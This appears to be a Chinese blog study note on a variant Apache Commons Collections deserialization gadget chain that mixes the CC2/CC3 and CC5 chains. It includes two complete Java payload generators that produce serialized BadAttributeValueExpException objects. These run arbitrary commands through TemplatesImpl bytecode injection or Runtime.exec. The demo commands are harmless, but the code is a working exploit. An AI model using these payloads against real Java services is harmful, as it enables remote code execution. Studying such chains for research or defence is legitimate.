# CC2+CC5变种写法

最近发现了一种CC2+CC5的变种写法，这是偶然间发现的一种写法，CC2中的调用链如下：

注意，CC3就是CC2的一种变种写法。所以这里也可以说是CC3+CC2+CC5的一种变种写法

```
Gadget chain:
    ObjectInputStream.readObject()
       PriorityQueue.readObject()
          ...
             TransformingComparator.compare()
                InvokerTransformer.transform()
                   Method.invoke()
                      Runtime.exec()
```

CC5中的调用链如下：

```
ObjectInputStream.readObject()
    BadAttributeValueExpException.readObject()
        TiedMapEntry.toString()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Class.getMethod()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.getRuntime()
                    InvokerTransformer.transform()
                        Method.invoke()
                            Runtime.exec()
```

CC2是通过queue中的Comparator来触发构造函数的然后触发compare方法，但是CC5是通过BadAttributeValueExpException来触发readObject最终创建ChainedTransformer实例并触发ChainedTransformer的。

当我在学习CC2完成后准备学习CC3的时候，因为ysoserial中的CC3使用了InvocationHandler，而InvocationHandler只有在JDK<7u21的时候才能触发。所以我把InvocationHandler换成了BadAttributeValueExpException，希望能够通过BadAttributeValueExpException来在JDK8中进行触发对应的代码，这样就可以不使用JDK7了，所以就有了以下的代码：

```java
public static void mainPayload() throws Exception {
    // 1. 创建恶意类
    ClassPool classPool = ClassPool.getDefault();
    CtClass evil = classPool.makeClass("yso.NewEvil");

    // 2. 插入静态代码块，执行任意命令
    String calcCode = "Runtime.getRuntime().exec(\"msinfo32.exe\");";  // 替换为你想执行的命令
    evil.makeClassInitializer().insertAfter(calcCode);

    // 3. 设置evil类的父类为AbstractTranslet
    classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    evil.setSuperclass(classPool.get(AbstractTranslet.class.getName()));

    // 4. 生成字节码
    byte[] bytecode = evil.toBytecode();

    // 5. 创建TemplatesImpl对象，并注入恶意字节码
    TemplatesImpl templates = new TemplatesImpl();
    Class<? extends TemplatesImpl> templatesClass = templates.getClass();
    Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
    bytecodes.setAccessible(true);
    bytecodes.set(templates, new byte[][]{bytecode});  // 设置恶意字节码

    // 6. 设置tfactory（TransformerFactoryImpl）
    Field tfactory = templatesClass.getDeclaredField("_tfactory");
    tfactory.setAccessible(true);
    tfactory.set(templates, new TransformerFactoryImpl());

    // 7. 设置name（模板名称）
    Field name = templatesClass.getDeclaredField("_name");
    name.setAccessible(true);
    name.set(templates, "NewPayload");

    // 8. 使用ChainedTransformer链进行链式反序列化
    ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
    });

    // 9. 创建LazyMap，并将ChainedTransformer注入其中
    Map<String, String> map = new HashMap<>();
    map.put("value", "1");
    Map lazyMap = LazyMap.decorate(map, chain);

    // 10. 创建TiedMapEntry，注入LazyMap
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);

    // 11. 创建BadAttributeValueExpException对象，并设置val字段为tiedMapEntry
    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
    Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
    val.setAccessible(true);
    val.set(badAttributeValueExpException, tiedMapEntry);


    // 12. 序列化到文件
    FileOutputStream fos = new FileOutputStream(serialFile);
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(badAttributeValueExpException);  // 进行反序列化触发payload
    oos.flush();
    oos.close();
    fos.close();
}
```

```java
public static void main1() throws Exception {

    Transformer[] transformer_exec = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"cmd /c start"})
    };
    ChainedTransformer chain = new ChainedTransformer(transformer_exec);
    
    Map<String, String> map = new HashMap<>();
    map.put("value", "1");
    Map lazyMap = LazyMap.decorate(map, chain);
    TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, 1);
    
    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
    Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
    val.setAccessible(true);
    val.set(badAttributeValueExpException, tiedMapEntry);

    FileOutputStream fos = new FileOutputStream(fileName);
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(badAttributeValueExpException);
    oos.flush();
    oos.close();
}
```

这份代码的最终触发点非常奇怪，我们看一下BadAttributeValueExpException中的readObject方法。

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    ObjectInputStream.GetField gf = ois.readFields();
    // 代码会在执行完这行代码之后触发，其实ois.readFields()执行之后代码就可以被触发了，只需要一个get工作就能触发刚才构造的静态代码块(通过IDEA中查看一下gf.objVals中的值，就能触发，所以推测是只要查看了gf中的objVals值就能触发静态代码块，不知道是什么逻辑)
    Object valObj = gf.get("val", null);

    if (valObj == null) {
        val = null;
    } else if (valObj instanceof String) {
        val= valObj;
    } else if (System.getSecurityManager() == null
            || valObj instanceof Long
            || valObj instanceof Integer
            || valObj instanceof Float
            || valObj instanceof Double
            || valObj instanceof Byte
            || valObj instanceof Short
            || valObj instanceof Boolean) {
        val = valObj.toString();
    } else { // the serialized object is from a version without JDK-8019292 fix
        val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
    }
}
```

不知道调用链怎么写了......学到了神奇的知识